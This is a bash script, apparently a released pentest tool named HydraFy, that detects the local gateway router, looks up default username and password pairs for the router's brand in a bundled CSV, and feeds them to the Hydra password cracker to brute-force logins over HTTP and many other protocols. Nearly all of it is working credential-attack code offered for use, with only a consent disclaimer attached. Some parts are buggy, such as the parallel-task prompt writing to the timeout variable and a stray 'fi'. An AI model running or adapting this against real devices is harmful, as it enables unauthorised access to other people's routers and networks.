#!/bin/bash

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
usage--()
{
clear
echo -e "$HDR\n****************HydraFy*****************
Author: stryngs ----> info [at] ethicalreporting.org
Version $OUT$current_ver$HDR (\033[1;33m$rel_date$HDR)$INS

Read Comments Prior to Usage"
echo -e "$HDR\nUsage:$INS\n
./hydrafy.sh$HDR
****************************************\n"
read
exit 0
}

rtr_check--()
{
awk -F \, '{print $1}' database.csv | grep -i $rtr database.csv > /dev/null 2>&1
if [[ $? -ne 0 ]];then
	clear
	echo -e "$OUT\n$rtr$INS is not listed in database.csv.
$INS
If $OUT$rtr$INS was not a misspell, please contribute to the hydrafy project
  by submitting any known information regarding the $OUT$rtr$INS series of routers
  (i.e.$OUT Usernames, Passwords, Spelling Variations, OUI Listings, etc$INS) to:$OUT\n
   info [at] ethicalreporting.org
  $INS Subj Line:$OUT hydrafy\n"
	read
	exit 0
else
	main_menu--
fi
}

protocol--()
{

	list_protocol--()
	{
	clear
	echo -e "$OUT\ncisco || cisco-enable || cvs || firebird || ftp || ftps || http[s]-{head|get}
http[s]-{get|post}-form || http-proxy || http-proxy-urlenum || icq || imap[s]
irc || ldap2[s] || ldap3[-{cram|digest}md5][s] || mssql || mysql || ncp || nntp
oracle-listener || oracle-sid || pcanywhere || pcnfs || pop3[s] || postgres
rdp || rexec || rlogin || rsh || sip || smb || smtp[s] || smtp-enum || snmp
socks5 || ssh || svn || teamspeak || telnet[s] || vmauthd || vnc || xmpp\n$INS
Press Enter to Return"
	read
	protocol--
	}

echo -e "$INP\nWhat protcol will you be using? [Enter $INS'list'$INP to see the protcols available)]"
read prt
if [[ $prt == "list" ]];then
	list_protocol--
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
declare--()
{
clear
if [[ -n $oui ]];then
	echo -e "$INP\nWould You Like to Update the OUI list? (y/n)"
	read var
	clear
	case $var in
		y|Y) update_oui--;;
	esac

	clear
	echo -e "$INS\nCurrently connected to a $OUT`grep $oui oui.csv | cut -d\| -f2`"
fi

echo -e "$INP\nWhat is the Brand of Router you would like to Parse/Attack?\n"
read rtr
if [[ -z $rtr ]];then
	echo -e "$WRN You Must Declare the Brand to Continue"
	read
	exit 1
else
	rtr_check--
fi
}

update_oui--()
{
echo -e "$OUT"
wget http://standards.ieee.org/develop/regauth/oui/oui.txt -O tmp.lst -T 10 -t 1
if [[ $? -ne 0 ]];then
	echo -e "$WRN\nUnable to Grab List From standards.ieee.org"
	rm -rf tmp.lst > /dev/null 2>&1
	sleep .7
else
	grep hex tmp.lst > mod-oui
	awk '{print $1}' mod-oui | sed 's/-/:/g' | tr [:upper:] [:lower:] > oui
	awk '{$1="";$2="";print}' mod-oui | sed 's/^[\t]*  //' | sed 's/ /-/g' > oui-name
	sed -i 's/,/-/g' oui-name
	paste -d ',' oui oui-name > oui.csv
	rm -rf oui-name oui mod-oui tmp.lst
	echo -e "$OUT\n\nOUI List Successfully Updated!"
	sleep 1.5
fi
}

main_menu--()
{
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------
           HydraFy
-------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Search/Save User-Pass Combos

2) Attack User-Pass Combos

R)edeclare Router Brand

E)xit HydraFy$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
read var
case $var in
	1) parent="1"
	parser--;;

	2) 
	which hydra > /dev/null 2>&1
	if [[ $? -ne 0 ]];then
		echo -e "$WRN\nYou Must Have Hydra in Your Path to Continue"
		sleep 1.5
		main_menu--
	else
		parent="2"
		parser--
	fi;;

	r|R) declare--;;

	e|E) exit 0;;

	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	main_menu--;;
esac
}

parser--()
{
#p_value= ## Parsing style
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---------------------------------------------
              Parser Instructions
---------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Anywhere$INS     [grep -i <brand of router>]$INP

2) Starts with$INS  [grep -i ^<brand of router>]$INP

3) Word match$INS   [grep -iwx <brand of router>]$INP

P)revious Menu

E)xit HydraFy\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
read p_value
case $p_value in
	1|2|3) case $parent in
		1) parse_menu--;;
		2) user_pass--;;
	esac;;

	p|P) main_menu--;;

	e|E) exit 0;; 
	
	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	parser--;;
esac
}

parse_menu--()
{
#selection= ## Menu Choice
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------
              Parser Choices
-------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Display Usernames:Passwords

2) Save Usernames:Passwords to a file

3) Save Usernames and Passwords seperately

P)revious Menu

E)xit HydraFy$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
read selection
case $selection in
	1) display--;;

	2) file_save-- single;;

	3) file_save-- dual;;

	p|P) parser--;;

	e|E) exit 0;;

	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	parse_menu--;;
esac
}

display--()
{
clear
echo -e "$HDR\n--------------------------------------------------------$OUT"
case $p_value in
	1) grep -i $rtr database.csv | awk -F \, '{print $2":"$3}';;

	2) grep -i ^$rtr database.csv | awk -F \, '{print $2":"$3}';;

	3) grep -iwx $rtr database.csv | awk -F \, '{print $2":"$3}';;
esac

echo -e "$HDR--------------------------------------------------------$INS

The usernames/passwords above were derived from this wordsearch:$OUT $rtr\n"
read
exit 0
}

file_save--()
{
if [[ -n combo.lst ]];then
	mv combo.lst combo.old > /dev/null 2>&1
fi

if [[ -n user.lst ]];then
	mv user.lst user.old > /dev/null 2>&1
fi

if [[ -n pass.lst ]];then
	mv pass.lst pass.old > /dev/null 2>&1
fi

case $1 in
	single)
	case $p_value in
		1) grep -i $rtr database.csv | awk -F \, '{print $2":"$3}' > combo.lst;;

		2) grep -i ^$rtr database.csv | awk -F \, '{print $2":"$3}' > combo.lst;;

		3) grep -iwx $rtr database.csv | awk -F \, '{print $2":"$3}' > combo.lst;;
	esac

	clear
	echo -e "$INS\nFile Written to: \033[1;33mcombo.lst\033[1;32m

The usernames/passwords were derived from this wordsearch:$OUT $rtr\n\n\n"
	read
	exit 0;;

	dual)
	case $p_value in
		1) grep -i $rtr database.csv | awk -F \, '{print $2}' > user.lst
		grep -i $rtr database.csv | awk -F \, '{print $3}' > pass.lst;;

		2) grep -i ^$rtr database.csv | awk -F \, '{print $2}' > user.lst
		grep -i ^$rtr database.csv | awk -F \, '{print $3}' > pass.lst;;

		3) grep -iwx $rtr database.csv | awk -F \, '{print $2}' > user.lst
		grep -iwx $rtr database.csv | awk -F \, '{print $3}' > pass.lst;;
	esac

	clear
	echo -e "$INS\nFiles Written to: \033[1;33muser.lst$INS and$OUT pass.lst$INS

The usernames/passwords were derived from this wordsearch:$OUT $rtr\n\n\n"
	read
	exit 0;;
esac
}

user_pass--()
{
style= ## Method of attack
while [ -z $style ];do
	clear
	echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
----------------------------------------------------
               Username/Password Usage
----------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) -C (recommended)$INS   ["login:pass" format]$INP

2) -L and -P$INS          [Username and Password format]$INP

P)revious Menu

E)xit HydraFy$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
	read style
	case $style in
		1) case $p_value in
			1) grep -i $rtr database.csv | awk -F \, '{print $2":"$3}' > snakebite.txt;;

			2) grep -i ^$rtr database.csv | awk -F \, '{print $2":"$3}' > snakebite.txt;;

			3) grep -iwx $rtr database.csv | awk -F \, '{print $2":"$3}' > snakebite.txt;;
		esac;;

		2) case $p_value in
			1) grep -i $rtr database.csv | awk -F \, '{print $2}' | sort | uniq > user.txt
			grep -i $rtr database.csv | awk -F \, '{print $3}' | sort | uniq > pass.txt;;

			2) grep -i ^$rtr database.csv | awk -F \, '{print $2}' | sort | uniq > user.txt
			grep -i ^$rtr database.csv | awk -F \, '{print $3}' | sort | uniq > pass.txt;;

			3) grep -iwx $rtr database.csv | awk -F \, '{print $2}' | sort | uniq > user.txt
			grep -iwx $rtr database.csv | awk -F \, '{print $3}' | sort | uniq > pass.txt;;
		esac;;

		p|P) parser--;;

		e|E) exit 0;;

		*) echo -e "$WRN\nYOU MUST MAKE A SELECTION TO PROCEED"
		sleep 1 
		style= ;; ## Nulled
	esac

done
var= ## Nulled
atk_mth--
}

atk_mth--()
{
ip=$router_ip ## Set to default for 1st Gateway
tgt_port=80 ## Default port most of the time
pth="/" ## Path past root
prt="http-get" ## Protocol
tsk="1" ## Parallel Tasking
to="5" ## Timeout limitations
var_I= ## Nulled
while [ -z $var ];do
	clear
	echo -e "$HDR########Example URL#########$INS
http://example.com/index.asp
-or-
http://192.168.1.1/index.asp$HDR
############################$INS

index.asp describes the \"path past root\"$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Tgt IP/Hostname   [$OUT$ip$INP]

2) Tgt Port          [$OUT$tgt_port$INP]

3) Path Past Root    [$OUT$pth$INP]

4) Protocol          [$OUT$prt$INP]

5) Parallel Tasks    [$OUT$tsk$INP]

6) Timeout Limit     [$OUT$to$INP]

C)ommence Attack

P)revious Menu

E)xit HydraFy$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
	read selection

	case $selection in
		1) echo -e "$INP\nTgt IP/Domain?"
		read ip;;

		2) echo -e "$INP\nTgt Port?"
		read tgt_port
		if [[ $tgt_port -lt 1 || $tgt_port -gt 65535 ]];then
			tgt_port=
		fi;;

		3) while [ -z $var_I ];do
			echo -e "$INP\nDoes the URL extend past root? <y or n>"
			read var_I
			case $var_I in
				y|Y) extend="yes" ;;
				
				n|N) extend="no"
				pth="/" ;;

				*) var_I= ;; ## Nulled
			esac

		done

		case $extend in
			yes) pth="/"
			pth_1= ## Nulled
			while [ -z $pth_1 ];do
				echo -e "$INP\nWhat is the path past root? $WRN{The / is pre-pended by default}$INP"
				read pth_1
			done

			pth=$pth$pth_1 ;;
		esac;;

		4) clear 
		protocol--;;

		5) echo -e "$INP\nParallel Tasks? $WRN{1-128}$INP"
		read to
		if [[ $tsk -lt 1 || $tsk -gt 128 ]];then
			tsk=
		fi;;

		6) echo -e "$INP\nTimeout limitation?"
		read to ;;

		c|C) if [[ -z $ip || -z $pth || -z $prt || -z $tsk || -z $to ]];then
			echo -e "$WRN\nAll Fields Must be Filled Before Proceeding"
			sleep 1
		else
			var=complete
		fi;;

		p|P) user_pass--;;

		e|E) exit 0;;
	esac

done

clear
case $style in
	1) hydra $ip -C snakebite.txt -t $tsk -w $to -V -f $prt $pth ;;
	2) hydra $ip -L user.txt -P pass.txt -t $tsk -w $to -V -f $prt $pth ;;
esac

read
reset
exit 0
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~ END Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
envir--()
{
WRN="\033[31m"   ## Warnings / Infinite Loops
INS="\033[1;32m" ## Instructions
OUT="\033[1;33m" ## Outputs
HDR="\033[1;34m" ## Headers
INP="\033[36m"   ## Inputs
}

current_ver="2.4"
rel_date="5 April 2013"
envir--

if [[ -n $1 ]]; then
	usage--
else
	router_ip=$(route -n | grep UG | awk '{print $2}')
	ping $router_ip -c 1 -s 1 > /dev/null 2>&1
	oui=$(arp -n $router_ip | tail -n1 | awk '{print $3}' | cut -d\: -f-3)
fi

	declare--
fi
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

script_info--()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: hydrafy.sh
## Copyright (C) <2012>  <stryngs>

## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.

## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.

## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to info [at] ethicalreporting.org

## Comments written with a triple # are notes to myself, please ignore them.
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.  Odds favor that they will be in /usr/bin or some other location readily available in your path...

## hydra
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## If you know of a router/username/password that is not included in database.csv, please make the appropriate changes to spread.ods and I will update as requested.  Make sure that if a username or password is "n/a", "blank", "none" or etc, that you leave it blank in the update request.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Configure a protocol check function to prevent improper syntax
## Figure out which protocols require the -U option for usage.
## Implement the -S flag for use with SSL, otherwise https probably won't work??
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## There is now an option for -C -or- -L and -P with reference to methodology of attack


## database.csv has been parsed for duplicate values and I have removed as many of them as I could find.


## On 5 April 2012, rtr_check--() was implemented.  Hopefully this will help to grow database.csv.


## As of 25 September 2012, the option for multiple protocol attacks were implemented.
## HydraFy has finally been ported over for usage on the N900!
## install_hydrafy_n900.sh file movements/creations:  ## For those who are curious what the file does, as it deletes itself...
	## /opt/usr/share/pixmaps/hydrafy_icon.png
	## /usr/bin/hydrafy.sh
	## /usr/share/applications/hildon/hydrafy.desktop
	## /home/user/MyDocs/pwnphone/hydrafy

## On 6 November 2012, a function to parse against the OUI of the currently connected router (if it existed) was added.
## This will add a great deal of speed to the functionality of hydrafy.
## Warning to the user on this:  The IEEE list is "skewed" at best, so ensure that you take the time to think about what you type in for parsing purposes once hydrafy asks you, typing it in exactly as the output shows for the above function is "dicey" at best...

## Updating of the OUI list has been added in as functionality

## On 4 April 2013, the original master spreadsheet was converted into csv format for easier updating and such
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## @Kos for forcing me to learn some regex

## @The_Eccentric for reigniting the spark to publish this script

## TAPE for making me look deper into regex and pointing out the 360+ duplicate usernames and passwords within database.csv

## Deviney for some of the ideas in atk_mth--(), the ideas behind protocol--() and list_protocol--()s

## foremost on the #maemo (freenode) for making me check into sudo...evidently route aint in the path, and ya gotz to sudo....  Thank buddy.

## JohnnyBom for having me explain some bash ninjitsu and stumblin upon an error in usage--()

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
sleep 0
}
